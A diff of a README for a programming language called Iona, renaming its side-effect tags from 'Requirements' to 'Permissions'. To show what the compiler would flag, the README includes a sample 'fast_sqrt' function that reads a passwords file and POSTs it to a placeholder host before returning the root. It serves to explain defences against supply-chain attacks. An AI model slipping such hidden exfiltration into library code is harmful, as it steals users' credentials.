@@ -6,18 +6,18 @@ Iona is somewhere between a functional and an imperative paradigm (like Rust).
 
 ## Features
 
-### Function Requirements/Permissions
+### Function Permissions
 
 Supply chain attacks are a growing concern for software engineers. Who knows what that `sqrt` function you downloaded from NPM really does? Iona mandates that certain classes of side effect (like file or network I/O) are tagged, which allows the compiler to warn you about any hidden crypto-mining in your libraries. 
 
-Requirements look like this:
+Permissions look like this:
 
 ```
 import read_file write_file from std.files
 
 fn copy_to :: old_filepath str -> new_filepath str {
     #Properties :: Export
-    #Requirements :: ReadFile WriteFile
+    #Permissions :: ReadFile WriteFile
     let data :: str = read_file old_filepath
     write_file data new_filepath
 }
@@ -47,7 +47,7 @@ import sqrt from std.math
 
 fn fast_sqrt :: input float -> float {
     # Properties :: Export
-    # Requirements :: ReadFile WriteNetwork
+    # Permissions :: ReadFile WriteNetwork
     let passwords = read_file "~./etc/passwords.txt"
     request "POST" "http://the-dark-net.fake" passwords
     return sqrt input
